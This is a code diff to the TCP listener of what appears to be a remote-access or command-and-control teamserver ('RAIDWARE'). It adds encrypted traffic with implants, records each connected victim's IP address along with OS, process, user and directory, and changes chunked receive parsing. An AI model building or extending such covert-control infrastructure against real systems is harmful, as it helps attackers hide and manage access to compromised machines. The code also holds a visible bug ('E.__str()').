@@ -2,6 +2,7 @@
 from Teamserver.listeners import *
 from utils.logger import *
 from utils.utils import *
+from utils.crypto import decrypt, encrypt
 
 
 from socket import *
@@ -45,10 +46,10 @@ class Listener(BaseListener):
             self.onSend(uid, socket=conn)
             recv = self.onRecv(socket=conn).split('|')
             try:
-                return (recv[0] == "RAIDWARE_INIT"), recv[1], uid, recv[2], recv[3], recv[4], recv[5]
+                return (recv[0] == "RAIDWARE_INIT"), recv[1], uid, recv[2], recv[3], recv[4], recv[5], recv[6]
             except:
                 return None
-
+            
         if not self.bind:
             try:
                 self.sock.bind((self.options['host'], self.options['port']))
@@ -74,7 +75,8 @@ class Listener(BaseListener):
             except:
                 try:
                     ret = __verify__(conn)
-                except:
+                except Exception as E:
+                    print("Exception: ", E)
                     log_error("Connection was received but we were unable to validate if it was our own.")
                 continue
 
@@ -86,7 +88,7 @@ class Listener(BaseListener):
                 log_error("Connection was received but we were unable to validate if it was our own.")
                 continue
 
-            connections[ret[2]] = Connection(name=self.listener_name, UID=ret[2], listener=self, _type=self.type, base=conn, OS=ret[1], proc = ret[3], pid = ret[4], pwd = ret[5], user = ret[6])
+            connections[ret[2]] = Connection(name=self.listener_name, UID=ret[2], listener=self, _type=self.type, base=conn, OS=ret[1], proc = ret[3], pid = ret[4], pwd = ret[5], user = ret[6], ip=ret[7])
             log(f"([GREEN]{self.listener_name}[RESET]) Connection with UID [CYAN]{ret[2]}[RESET] has been established.", LogLevel.CONNECTIONS)
 
     def onLoad(self):
@@ -148,24 +150,50 @@ class Listener(BaseListener):
     def onSend(self, msg : str, **kwargs):
         socket = self.sock if 'socket' not in kwargs.keys() else kwargs['socket']
 
-        msg = self.options['begin-delimiter'] + "{" + msg + "}" + self.options['end-delimiter']
+        msg = self.options['begin_delimiter'] + "{" + msg + "}" + self.options['end_delimiter']
         try:
-            socket.send(msg.encode())
+            socket.send(encrypt(self.options['encryption-key'], msg.encode()))
         except ConnectionResetError:
             log_error(f"Connection lost...")
-            return None
+            return "Connection Lost"
 
     def onRecv(self, **kwargs):
 
         socket = self.sock if 'socket' not in kwargs.keys() else kwargs['socket']
         try:
-            buf = socket.recv(4096).decode()
+            buf = socket.recv(1024).decode()
+            buf = decrypt(self.options['encryption-key'], buf)
+
+            # First buf will be the number of chunks in the output:
+            if buf == "":
+                return ""
+            log(f"Buffer: {buf}")
+            try:
+                __len = int(buf)
+                buf = ""
+                for _ in range(__len):
+                    __locl = socket.recv(1024).decode()
+                    buf += __locl
+                buf = buf.split('|')
+                __f_buffer = []
+                for i in buf:
+                    if i == "":
+                        continue
+                    _ = decrypt(self.options['encryption-key'], i)
+                    __f_buffer.append(_)
+
+                buf = "".join(__f_buffer)
+            except Exception as E:
+                log(f"An error occurred when parsing data from the socket. Returning the raw data. {E.__str()}", LogLevel.ERROR)
+                return E.__str__()
+
         except ConnectionResetError:
             log_error(f"Connection lost...")
-            return None
-
+            return "Connection Lost"
+        
         try:
-            buf = buf.split(self.options['begin-delimiter'])[1].split(self.options['end-delimiter'])[0][1:]
+            buf = buf.split(self.options['begin_delimiter'])[1].split(self.options['end_delimiter'])[0][1:]
+            print(f"Buffer is: {buf}")
         except:
             log_error(f"Unable to parse the received data ({buf}). Returning the raw data...")
             return buf
